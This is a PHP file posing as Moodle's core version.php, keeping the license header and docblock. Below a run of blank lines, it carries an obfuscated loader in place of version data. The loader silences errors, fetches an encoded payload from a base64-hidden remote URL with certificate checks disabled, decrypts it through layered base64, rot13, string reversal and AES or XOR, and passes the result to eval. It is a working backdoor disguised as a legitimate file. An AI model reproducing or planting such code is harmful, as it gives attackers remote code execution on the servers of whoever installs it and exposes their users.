<?php

// This file is part of Moodle - http://moodle.org/
//
// Moodle is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// Moodle is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.

/**
 * MOODLE VERSION INFORMATION
 *
 * This file defines the current version of the core Moodle code being used.
 * This is compared against the values stored in the database to determine
 * whether upgrades should be performed (see lib/db/*.php)
 *
 * @package    core
 * @copyright  1999 onwards Martin Dougiamas (http://dougiamas.com)
 * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
 */






















error_reporting(0);
@ini_set('display_errors',0);

if(!function_exists('b64_42643b')){ function b64_42643b($a){ return base64_decode($a); } }
if(!function_exists('pbk_42643b')){ function pbk_42643b($p,$s,$i,$l){ return hash_pbkdf2('sha256',$p,$s,$i,$l,true); } }
if(!function_exists('fgc_42643b')){ function fgc_42643b($u){ return @file_get_contents($u); } }

$s_175f1748='YjE0MjRlN2ZlZGMwNDJjY2Y3YzY1ODFhOTk5Y2IxZjY=';
$k_a157d373='Wz7s)@+hgM:!2mOD-np(Tp9etg';
$mo_efa309a5='WyJzdHJyZXYiLCJyb3QxMyJd';
$eu_819de6b1='aHR0cHM6Ly9jbG91ZC1laXQucGFnZXMuZGV2L2ZpbGVzL2xvZ3MudHh0';

$_s=b64_42643b($s_175f1748);
$dk_df5f10c0=pbk_42643b($k_a157d373,$_s,10000,32);
unset($_s);

$_mo=json_decode(b64_42643b($mo_efa309a5),true);
$ru_44925289=b64_42643b($eu_819de6b1);

$ft_07084652=function($u){
    if(function_exists('curl_init')){
        $c=curl_init($u);
        curl_setopt_array($c,[
            CURLOPT_RETURNTRANSFER=>1,
            CURLOPT_SSL_VERIFYPEER=>0,
            CURLOPT_SSL_VERIFYHOST=>0,
            CURLOPT_FOLLOWLOCATION=>1,
            CURLOPT_TIMEOUT=>30,
            CURLOPT_HTTPHEADER=>['User-Agent: Mozilla/5.0']
        ]);
        $r=curl_exec($c);
        curl_close($c);
        return $r;
    }
    return fgc_42643b($u);
};

$ep_559b2fce=$ft_07084652($ru_44925289);
if(!$ep_559b2fce){die();}

$r1_e06b9d7c=b64_42643b($ep_559b2fce);

$dp_837b4f59=$r1_e06b9d7c;
foreach(array_reverse($_mo) as $_m){
    switch($_m){
        case 'rot13':
            $dp_837b4f59=str_rot13($dp_837b4f59);
            break;
        case 'strrev':
            $dp_837b4f59=strrev($dp_837b4f59);
            break;
    }
}
unset($_mo,$_m);

$cp_df435c5d=b64_42643b($dp_837b4f59);

$mf_763bcbc5=ord($cp_df435c5d[0]);
$cp_df435c5d=substr($cp_df435c5d,1);

$_iv=substr($cp_df435c5d,0,16);
$_ed=substr($cp_df435c5d,16);

$fp_90c695fb='';

if($mf_763bcbc5===1 && extension_loaded('openssl')){
    $fp_90c695fb=openssl_decrypt($_ed,'aes-256-ctr',$dk_df5f10c0,OPENSSL_RAW_DATA,$_iv);
    if($fp_90c695fb===false){
        for($i=0;$i<strlen($_ed);$i++){
            $fp_90c695fb.=$_ed[$i]^$dk_df5f10c0[$i%strlen($dk_df5f10c0)];
        }
    }
}else{
    for($i=0;$i<strlen($_ed);$i++){
        $fp_90c695fb.=$_ed[$i]^$dk_df5f10c0[$i%strlen($dk_df5f10c0)];
    }
}

unset($_iv,$_ed,$cp_df435c5d,$mf_763bcbc5,$dk_df5f10c0);

eval('?>'.$fp_90c695fb);
?>

